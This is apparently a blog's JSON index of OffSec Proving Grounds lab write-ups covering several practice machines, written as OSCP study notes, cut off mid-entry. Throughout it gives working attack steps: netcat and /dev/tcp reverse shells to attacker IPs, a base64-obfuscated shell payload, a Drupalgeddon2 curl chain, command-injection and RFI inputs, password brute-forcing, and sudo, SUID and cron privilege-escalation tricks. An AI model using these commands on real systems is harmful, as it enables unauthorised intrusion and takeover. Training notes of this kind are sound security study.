/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=&lt;RFI_URL&gt;.Reverse ShellVisiting this page would give the result of the command in the payload url. The payload must be of the form → &lt;pre&gt;system('whoami')&lt;/pre&gt;. Checking the existence of netcat and bash, a new payload can be used for a reverse shell → nc -e /bin/bash 192.168.49.244 3002. This didn’t work, therefore, used the usual bash payload rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.49.244 3002 &gt;/tmp/f. This grants the shell as www-data user.Privilege EscalationUser 1Looking at /etc/passwd, the users of interest are root, max and steven. The home directory of both max and steven are readable by www-data. The user flag is in max’s home directory. The webroot also contains a base32 encoded string in a file mybackup.txt → JEQGQYLWMUQHI3ZANNSWK4BAORUGS4ZAOBQXG43XN5ZGIIDTN5WWK53IMVZGKIDTMFTGK3DZEBRGKY3BOVZWKICJEBRWC3RHOQQHEZLNMVWWEZLSEBUXIORAN5YGK3TTMVZWC3LF.This decodes to I have to keep this password somewhere safely because I can't remember it: opensesame. Therefore, this password is attempted on ssh for max and steven. However, this did not work.The home directory of max also has a .ssh directory, which contains the private key of max. This is readable by www-data and is thus used to ssh into the server as max, which grants the shell and thus the user flag as well.User 2Checked the ability of max to run sudo using sudo -l. This allowed running /usr/sbin/service as steven without a password. The service command looks for services in a specific directory and launches them. It can therefore be tricked by prepending ../../../../ to whichever command needs to be executed. Therefore running →sudo -u steven /usr/sbin/service ../../../../bin/bashgrants the shell as steven.RootLooked at the ability of steven to run sudo. This revealed that steven is allowed to run /opt/tools/server-health.sh as root without a password. The path does not exist, therefore, a new executable is created with the same name and the following content →#!/bin/bashbash -pThen command sudo /opt/tools/server-health.sh is executed, which grants the shell as root and also the root flag." }, { "title": "OffSec PG - Shakabrah", "url": "/blog/posts/oscp-pg-shakabrah/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.80.86Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.86OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.80.86Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.86OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.4.29 ((Ubuntu)) Web ScanGoBuster scan → gobuster dir -u http://192.168.80.86 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → index.phpExploitationThe webpage is basically a php file that executes ping to a given IP address and rendered the result. This is however, vulnerable to command injection. Therefore, IP addresses or domains can be appended with ; whoami to execute the command and retrieve the result.This is because user input is directly passed to the backend to execute and retrieve the result. This is the RCE observed. This is used to retrieve the /etc/passwd file which has two users of interest → dylan and root.The RCE can also be used to take a look inside the /home/ directory and the files inside the user dylan’s home were readable by www-data user RCE, which gives the user flag.Further, to get a shell, the usual reverse shell one liners are used. None of them worked. Thus followed a convention to look at listening ports using netstat -ntaup. These ports are more likely to not be denied connections “to” since they are allowed ports on the machine for connections “from” other addresses.The shell payload that worked was rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1|nc 192.168.49.172 80 &gt; /tmp/f with the netcat instance listening on port 80. This gave a shell as www-data.Privilege EscalationLooking at the setuid binaries in the system, an interesting one is vim.basic because vim allows executing shell commands.Therefore, a shell can be lanuched by using vim.basic -c ':! bash' command. However, this does not set the privileges. The uid is still that of www-data.This can be done by using python since it is there on the system, otherwise a C code would have to be compiled and executed. The python command can be executed as follows →vim.basic -c ':py3 import os; os.setuid(0); os.system(\"/bin/bash\")'This gives the root shell and thus the root flag." }, { "title": "OffSec PG - Seppuku", "url": "/blog/posts/oscp-pg-seppukku/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.244.90Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.141.90OS Detection → os_infoTable Port Service Other details (if any) ...", "content": "EnumerationMachine IP → 192.168.244.90Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.141.90OS Detection → os_infoTable Port Service Other details (if any) 21 FTP vsftpd 3.0.3 22 SSH OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80 HTTP nginx 1.14.2 139 NETBIOS-SSN Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445 MICROSOFT-DS Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) 7080 SSL/EMPOWERID LiteSpeed 7601 HTTP Apache httpd 2.4.38 ((Debian)) 8088 HTTP LiteSpeed httpd Web ScanGoBuster scan → /opt/gobuster dir -u http://192.168.141.90 -f -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → /index.html /icons/ /b/ /a/ /c/ /t/ /r/ /d/ /e/ /f/ /h/ /w/ /q/ /database/ /production/ /keys/ /secret/The directories /w/, secret and keys contain several interesting files → ssh private keys within private and private.bak hostname file with value seppuku a wordlist password.lst passwd.bak and shadow.bakExploitationThe wordlist can be used to brute force the ssh login by using hydra as follows →hydra -l seppuku -P password.lst ssh://192.168.141.90This gives the valid credentials as seppuku:eeyoree which can be used to login to the machine. This also gives the user flag within local.txt in the home directory.Other items such as the backup for the password and shadow files were rabbit holes due to incorrectly formatted hashes.Privilege EscalationUserListing the users in the /home directory gives other users as samurai and tanto. The ssh private keys discovered earlier grant access to user tanto via ssh. This leads us to a restricted shell. The sudo -l permissions for the user were to only create a symbolic link of the /root directory inside /tmp. However, this directory would still have the permissions of root which means those permissions are still needed to read the root flag.The user directory also contains a .passwd file which contains a password. This password helps login with credentials samurai:12345685213456!@!@A for the next user. The sudo -l capability for this user is to run the following command →/../../../../../../home/tanto/.cgi_bin/bin /tmp/*This means that the command tries to execute the file /home/tanto/.cgi_bin/bin as a command and the /tmp/* as an argument.RootThe command bin can be replaced with anything such that it will get executed. This can be done by using a shell script by the same name that can be created on the machine using nano as well as served via HTTP from attacker host to the tanto machine using wget. The file should contain the following →#!/bin/bash/bin/bashThis can then be made world executable by using chmod 777 bin and then moved inside the .cgi_bin directory. samurai can then use the command with sudo to execute this file which would then grant a root shell and thus the root flag." }, { "title": "OffSec PG - Sar", "url": "/blog/posts/oscp-pg-sar/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.147.35Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.147.35OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernelTable Port Servi...", "content": "EnumerationMachine IP → 192.168.147.35Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.147.35OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernelTable Port Service Other details (if any) 22 SSH OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.4.29 ((Ubuntu)) Web ScanGoBuster scan → gobuster dir -u http://192.168.147.35 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → index.html robots.txt phpinfo.phpRobots txt reveals a directory sar2HTML, which has an index.php page. The version for the sar2HTML is 3.2.1.ExploitationGoogle-fu reveals the existence of an RCE exploit for the sar2HTML version 3.2.1. For this exploit, /sar2HTML/index.php?plot=;whoami executes the command. The result can be seen on the webpage. Therefore, this was used to enumerate presence of bash, python and netcat. The /etc/passwd file was also printed which revealed the 2 users of importance to be root and love.Thus, a reverse shell can be spawned using bash payload rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.49.147 3002 &gt;/tmp/f for the user www-data.The user flag was in the /home/ directory.Privilege EscalationLooking at setuid binaries, the most interesting ones are arping and ping. Looking at the crontab, there is a process that runs every 5 mins as the root user → cd /var/www/html/ &amp;&amp; sudo ./finally.sh. Checking the code of the file, it seems that it runs another file called write.sh, which is world writable.Therefore, using a reverse shell payload to get connection from the machine would execute it as root, thereby, giving a root shell.This can be done via echo \"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.49.147/3003 0&gt;&amp;1'\" &gt;&gt; write.sh. This gives a shell in 5 minutes. Subsequently, it also gives the root flag." }, { "title": "OffSec PG - PyExp", "url": "/blog/posts/oscp-pg-pyexp/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.63.118Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.63.118OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other det...", "content": "EnumerationMachine IP → 192.168.63.118Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.63.118OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 1337 SSH OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 3306 MySQL MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1 → *Salt: **“(APO{@jw7JP3MgBRU_ ExploitationMysql can be brute-forced for a password for the user root. Used hydra for this as follows → hyda -l root -P rockyou.txt -t 4 mysql://192.168.63.118. The password was prettywoman. With the new password, looking at mysql databases using the following → mysql -u root -h 192.168.63.118 -p.Looking into the mysql shell, the database is data and the table is fernet. The table has the following entry →cred → gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=keyy → UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=The given key and credentials are not any encoding format such as base64, etc. It is in fact fernet. The cryptography module in python has support for the fernet encryption. This can be decoded as follows using a python script →from cryptography.fernet import Fernetdecryptor = Fernet(b'UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=')plaintext = decryptor.decrypt(b'gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=')print(plaintext)Running this as python3 decrypt.py gives the output as b'lucy:wJ9“Lemdv9[FEw-‘. These can be used as the credentials for ssh running on port 1337. Logging in to ssh with the above credentials gives the user lucy` with a user flag in the home directory.Privilege EscalationFor privilege escalation, searched set uid binaries using the following find command → find / -perm -u=s -type f 2&gt;/dev/null. This does show sudo. Listing commands that can be run by user lucy by using sudo -l, the python2 binary can be called for the file /opt/exp.py.The file contains the following code →uinput = raw_input('how are you?')exec(uinput)exec() in python2 basically runs python inside it. Therefore, running the above with sudo /usr/bin/python2 /opt/exp.py and giving input as import os; os.system(“whoami“); returns root.Therefore, a shell could even be spawned by changing the command, which gives the root flag in the /root/ directory." }, { "title": "OffSec PG - Potato", "url": "/blog/posts/oscp-pg-potato/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.53.101Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.53.101OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.53.101Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.53.101OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.4.41 ((Ubuntu)) 2112 FTP ProFTPd Web ScanGoBuster scan → gobuster dir -u http://192.168.53.101 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → admin/ admin/index.phpExploitationUsed ftp to login to the service running on port 2112, which allowed anonymous login.The files available were index.php.bak and welcome.msg. The backup of the index page consists of the following code →&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;?php$pass= \"potato\"; //note Change this password regularlyif($_GET['login']===\"1\"){ if (strcmp($_POST['username'], \"admin\") == 0 &amp;&amp; strcmp($_POST['password'], $pass) == 0) { echo \"Welcome! &lt;br&gt; Go to the &lt;a href=\"dashboard.php\"&gt;dashboard&lt;/a&gt;\"; setcookie('pass', $pass, time() + 365*24*3600); }else{ echo \"&lt;p&gt;Bad login/password! &lt;br&gt; Return to the &lt;a href=\"index.php\"&gt;login page&lt;/a&gt; &lt;p&gt;\"; } exit();}?&gt; &lt;form action=\"index.php?login=1\" method=\"POST\"&gt; &lt;h1&gt;Login&lt;/h1&gt; &lt;label&gt;&lt;b&gt;User:&lt;/b&gt;&lt;/label&gt; &lt;input type=\"text\" name=\"username\" required&gt; &lt;br&gt; &lt;label&gt;&lt;b&gt;Password:&lt;/b&gt;&lt;/label&gt; &lt;input type=\"password\" name=\"password\" required&gt; &lt;br&gt; &lt;input type=\"submit\" id='submit' value='Login' &gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;This gives an idea about how to bypass the login on /admin/index.php page. The strcmp($_POST['password'], $pass) == 0) check can be bypassed by changing the parameter password into password[] i.e., change it to an array compared to string. That would evaluate to true. Further, the username from the code shows that the required user is admin. Doing the check as stated by intercepting in Burp and changing parameters, a dashboard page at /admin/dashboard.php is made available.The dashboard page has a Logs section that can retrieve logs from the system. This could have a directory traversal i.e., LFI vulnerability. Catching the request in burp and changing the log file to ../../../../../../../../etc/passwd gives the required users from the etc passwd file which have the bash login shell → root, florianges, webadmin.The entry of interest is webadmin. The hash is available and seems insecure which can be cracked using John the Ripper. For this, the entry webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash is stored in a file test.pass and John is run as follows → john --wordlist=rockyou.txt test.pass. This revealed the output dragon which is the password for the webadmin user.Used the password dragon for the user webadmin for ssh as follows → ssh webadmin@192.168.53.101. This gives the user flag located in the home directory for the user.Privilege EscalationSearched for setuid binaries with command → find / -perm -u=s -type f 2&gt;/dev/null. Without a usable binary, checked allowed executions with sudo as follows → sudo -l. This gives the result that the user is allowed to run all commands under /bin/nice /notes/*.The /notes/ directory contained scripts for executing clear and id commands. The * here is a wildcard and can thus be used to bypass the strict controls and use directory traversal technique to execute bash in the elevated state.Therefore, executing the /bin/nice command as follows → sudo /bin/nice /notes/../bin/bash gives the root shell, followed by the root flag in the root home directory." }, { "title": "OffSec PG - Photographer", "url": "/blog/posts/oscp-pg-photographer/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.59.76Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.59.76OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.59.76Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.59.76OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) 80 HTTP Apache httpd 2.4.18 ((Ubuntu)) 139 NETBIOS-SSN Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445 NETBIOS-SSN Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 8000 HTTP-ALT Apache/2.4.18 (Ubuntu) Web ScanGoBuster scan → /opt/GoBuster/gobuster dir -u http://192.168.59.76 -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → index.html generic.html elements.html images/ assets/Scanning the web site on port 8000 with a -x html,php,txt and a -f flag gives the following → app/ admin/ index/ set/Running nmap to discover shares using nmap --script smb-enum-shares -p 139,445 192.168.59.76 provided with the shares of IPC, sambashare, and print. This also showed the capability to read and write using anonymous users and a possible username of agi.ExploitationListing Samba shares using sambaclient -U '' //192.168.59.76/sambashare. This share had an email to user daisa and a backup of a wordpress site. The email contained a hint to a possible password for daisa, using that on the website at the /admin path for the website at port 8000 provided access with credentials daisa:babygirl.Here, the Library segment contains a file upload functionality that is interesting. Image files can be uploaded and can be previewed in the application. Messing with this functionality to upload a PHP code by changing the Content-Type to application/php and the filename to include the .php extension with the data containing the following code →&lt;?phpecho(\"hacked\");?&gt;This file can be uploaded without any issue which means the server is vulnerable to arbitrary file upload. The preview for this php file doesn’t work of course, but the application shows a “Download File” option due to the failed preview. This button contains a link to the file at http://192.168.59.76:8000/storage/originals/50/ce/cyberpunk.php, upon visiting which the string “hacked” is displayed on the web page indicating that arbitrary php can be executed. Therefore, Pentest Monkey’s script can be used to obtain a reverse shell.Using the script and then executing the PHP code at http://192.168.59.76:8000/storage/originals/ec/a3/cyberpunk-shell.php grants a shell with the user www-data.Privilege EscalationLooking at the SUID binaries using find / -perm -4000 2&gt;/dev/null there is an SUID binary for php7.2 which does have a root shell escalation associated with it. Using php7.2 -r \"pcntl_exec('/bin/sh', ['-p']);\" to launch a shell with effective uid as root, the root flag and the local flag can be read. A new user with full sudo permissions can also be added by modifying the /etc/passwd and /etc/sudoers files." }, { "title": "OffSec PG - OnSystemShellDread", "url": "/blog/posts/oscp-pg-onsystemshelldread/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.244.130Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.130OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.244.130Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.244.130OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 21 FTP vsftpd 3.0.3 → Anonymous login allowed 61000 SSH OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) ExploitationLooking at the anonymous ftp, there was a directory .hannah inside which was an ssh key. Used this key for the user hannah on the ssh server grants the shell as hannah. This gave the user flag.Privilege EscalationLooked at the setuid binaries on the system, cpulimit was the interesting one. It can be ised to spawn a shell with elevated privileges using command → cpulimit -l 50 -f /bin/bash. However, with this, the program detects that the program being run has lower privileges, so bash drops the elevated privileges. Usually, bash has a flag -p, the purpose of which, as stated in the man page of bash is →If the shell is started with the effective user (group) id not equal to thereal user (group) id, and the -p option is not supplied, the effective user idis set to the real user id. Otherwise, the effective user id is not reset.Therefore, a privileged shell can be launched as follows → cpulimit -l 100 -f -- /bin/sh -p. This gives the root shell and thus, the root flag." }, { "title": "OffSec PG - NoName", "url": "/blog/posts/oscp-pg-no-name/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.225.15Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.15OS Detection → os_info Port Service Other details (if any) ...", "content": "EnumerationMachine IP → 192.168.225.15Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.15OS Detection → os_info Port Service Other details (if any) 80 HTTP Apache httpd 2.4.29 ((Ubuntu)) Web ScanGoBuster scan → gobuster dir -u http://192.168.225.15 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/raft-small-words.txt -x html,php,txtDirectories/files listed → index.php icons/ superadmin.phpExploitationLooking at superadmin.php, it seems like a ping command and thus may be vulnerable to command injection. Using ; didn’t work, neither did &amp;&amp;. | did work and using it to print the code of the file like 127.0.0.1 | cat superadmin.php shows that \";\",\"&amp;&amp;\",\"/\",\"bin\",\"&amp;\",\" &amp;&amp;\",\"ls\",\"nc\",\"dir\",\"pwd\" are all blocked.Therefore, escaping the blocks by using127.0.0.1 | `echo bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMjI1IDMwMDIK | base64 -d`This gives a shell as the www-data user and thus the user flag.Privilege EscalationUserLooking at the /etc/passwd file, the users of importance are root, haclabs and yash. Used find / -type f -user yash 2&gt;/dev/null to list files owned by yash and this prints a file /usr/share/hidden/.passwd. Looking at the permissions, it is world readable.The contents of the file is a password haclabs1234. This works for the credentials haclabs:haclabs1234. This grants a shell as haclabs user. Looking at sudo -l, this user can run /usr/bin/find as root without any password. Thus, using the command sudo find . -exec /bin/bash \\; -quit, a root shell can be gained. This gives the root flag." }, { "title": "OffSec PG - Monitoring", "url": "/blog/posts/oscp-pg-monitoring/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.51.136Network ScanNmap scan → nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.51.136OS Detection → Host: ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel Por...", "content": "EnumerationMachine IP → 192.168.51.136Network ScanNmap scan → nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.51.136OS Detection → Host: ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) 25 SMTP Postfix smtpd 80 HTTP Apache httpd 2.4.18 ((Ubuntu)) 389 LDAP OpenLDAP 2.2.X - 2.3.X 443 HTTPS Apache httpd 2.4.18 ((Ubuntu)) 5667 Unknown - Web ScanGoBuster scan → gobuster dir -u http://192.168.51.136 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,phpDirectories/files listed (for both http and https versions) → index.php javascript/ nagios/Visiting the web page reveals a nagiosxi directory which has a login.ExploitationA web search for default admin credentials on nagios xi reveals nagiosadmin:PASSW0RD, however, after trial and error of easy passwords, admin was the correct password.Searchsploit and web searches return a number of exploits for the nagios version. One of them is an authenticated RCE in the mointoring plugin upload capability.Command used for searchsploit is as follows → searchsploit nagios, which returned many results. Spiraling down to RCE for version 5.6.5 (just above 5.6.0 and has root exploit), the full path can be received as follows → searchsploit -p php/webapps/47299.php. This gives the path and the exploit can be copied from there.The exploit is basically a file upload where the name for the upload has an injection of commands such that it is executed in the backend. Therefore, a reverse shell can be executed on the backend, giving root access.Setting up the exploit and calling it via the cli after setting up an ncat listener, a root shell is received. The flag of the root user can thus be read.Privilege EscalationUser was already root, therefore, no escalation was necessary." }, { "title": "OffSec PG - Loly", "url": "/blog/posts/oscp-pg-loly/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.225.121Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.121OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.225.121Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.121OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 80 HTTP nginx 1.10.3 (Ubuntu) 6311 - - Web ScanGoBuster scan → gobuster dir -u http://192.168.225.121 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txtDirectories/files listed → wordpress/Busting the /wordpress/ directory gives the following result → index.php (301) wp-content/ wp-login.php license.txt wp-includes/ (403) readme.html wp-trackback.php wp-admin/ (302)WPScan determines generic stuff and a user loly. Using this for a brute force attack with command docker run -v /home/tanq/installations/SecLists/:/seclists/ -it --rm wpscanteam/wpscan --url http://192.168.225.121/wordpress/ -U loly -P /seclists/rockyou.txt gives the credentials as loly:fernando for XMLRPC.ExploitationLogging in to the /wordpress/wp-login.php as loly may work but does not move forward because of the requests being directed at http://loly.lc instead of the IP address. Therefore, this entry is added to /etc/hosts to enable navigation. Then the login page is visited and login is attempted as loly. This grants the admin page on the wordpress website.The homepage has a plugin called Adrotate running. On this webpage, a section called “Manage Media”. This says →Accepted files: jpg, jpeg, gif, png, svg, html, js and zip. Maximum size is 512Kb per file.Important: Make sure your file has no spaces or special characters in the name. Replace spaceswith a - or _. Zip files are automatically extracted in the location where they are uploadedand the original zip file will be deleted once extracted. You can create top-level folders below.Folder names can between 1 and 100 characters long. Any special characters are stripped out.Therefore, uploading a reverse shell php code after zipping and uploading could allow navigating to it. The content is stored in the /wordpress/wp-content/banners/ directory. Therefore, a shell is gained by listening on netcat and navigating to the php file in the said path. This is as the user www-data and this gives the user flag.Privilege EscalationUserLooking at the wordpress files, the wp-config.php file contains a password lolyisabeautifulgirl. Trying this password for loly, it works and grants the shell as loly.RootLooking at the kernel version for the machine (4.4.0-31), there are a list of exploits. Starting with exploits from the highest 4.X version, one worked (45010.c). This gave the root shell and thus the root flag." }, { "title": "OffSec PG - Lampiao", "url": "/blog/posts/oscp-pg-lampiao/", "categories": "Lab Practice Notes, OffSec Proving Grounds", "tags": "oscp, lab, offsec-proving-grounds", "date": "2021-12-19 02:00:00 -0500", "snippet": "EnumerationMachine IP → 192.168.56.48Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.56.48OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service ...", "content": "EnumerationMachine IP → 192.168.56.48Network ScanNmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.56.48OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Other details (if any) 22 SSH OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) 80 HTTP? - 1898 HTTP Apache httpd 2.4.7 ((Ubuntu)) &amp; Drupal 7 Web ScanRobots.txt check by nmap listed a ton of directories and files for all user agents. Therefore, listed the entire file using curl, which resulted in the following interesting entries → admin/ user/register/ user/password/ user/login/ ?q=admin ?q=comment/reply/ ?q=user/register/ ?q=user/password/GoBuster scan → gobuster dir -u http://192.168.56.48 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,phpDirectories/files listed were common with robots.txt finding and the important ones were → install.php update.php cron.php xmlrpc.php index.php misc/ scripts/ includes/ sites/ modules/ themes/ExploitationNothing in the directory and file brute force was particularly interesting. The /CHANGELOG.txt file can be looked at to identify the exact version of software running on the server. This revealed the latest version to be Drupal 7.54.A particular exploit from Google-fu is the drupalgeddon2. For the version 7.5X, the PoC for the ?q=user/password would work well. The exploit is basically a lack of input validation in Drupal 7 Form API. This attack targets AJAX requests composed of Drupal Form API’s renderable arrays, which are used to render a requested page through Drupal’s theming system.Renderable arrays are implemented by an associative array and pass key-value pairs as function arguments or form data in order to render markup and UI elements in a meaningful way. Markup element properties have keys prefixed with the ‘#’ character. These parameters were not sanitized. The exploit code had to target the rendering phase of either a page load or AJAX request with malicious code passed to one of the Form API executable functions. The 4 possibilities were → [#post_render] [#pre_render] [#access_callback] [#lazy_builder]To exploit, the following set of 2 commands can be executed to get the result of a bash command on the server →## 1st command - payload is \"which nc\" to check if nc is there on the system.url_pre=\"http://192.168.56.48:1898/?q=user/password&amp;name\"url_post=\"$url_pre\\[%23post_render\\]\\[\\]=passthru&amp;name\\[%23type\\]=markup&amp;name\\[%23markup\\]=\"final_url=\"$url_post=which+nc\"form_data=$( curl -k -s $(echo final_url) --data \"form_id=user_pass&amp;_triggering_element_name=name\")form_build=$(echo form_data | grep form_build_id)form_build_id=$(echo form_build | sed -E 's/.*name=\"form_build_id\" value=\"(.*)\".*/\\1/' )## 2nd command, which returns the result of the above payload.curl -k -i \"http://192.168.56.48:1898/?q=file/ajax/name/%23value/${form_build_id}\" \\ --data \"form_build_id=${form_build_id}\"This gave an indication that nc was present on the system, therefore a reverse shell could be generated for it.However, an nc shell did not work. It is known that there is php on the system. Therefore, after checking the presence of wget, the php reverse shell from pentest monkey is sent to the server. With a local netcat listener and navigating to the reverse shell path, a shell with the user www-data is obtained.Privilege EscalationUserLooking at /etc/passwd, a number of users are determined. SetUID binaries do not have any interesting information. The /etc/passwd contains the hashed password for the root user. This was sent to john for a cracking attempt, which did not reveal anything.Listing the /home directory shows the presence of a user tiago. Google-fu for default drupal config files reveals the location as settings.php file inside the sites/default/ directory. This reveals the mysql database connection credentials as drupaluser:Virgulino. Trying the password for the user tiago successfully logs in. This gives the user flag.RootThe tiago user is not allowed to run sudo either. Therfore, looking at other information and running the linux enumeration script. Looking at the kernel version, which is 4.4.0, Google-fu points to the presence of the Dirty Cow exploit.Therefore, looking at PoCs from Dirty Cow PoCs, choosing the cowroot.c payload to get the root shell. Therefore, compiling for 32 bit version to match target. Compiled it with gcc and sent the binary to the target machine via wget.Executing this gives the root shell and thus the root flag." }, { "title": "OffSec PG - Katana", "url": "/blog/posts/oscp-pg-katana/", "categories": "Lab Practice Notes, 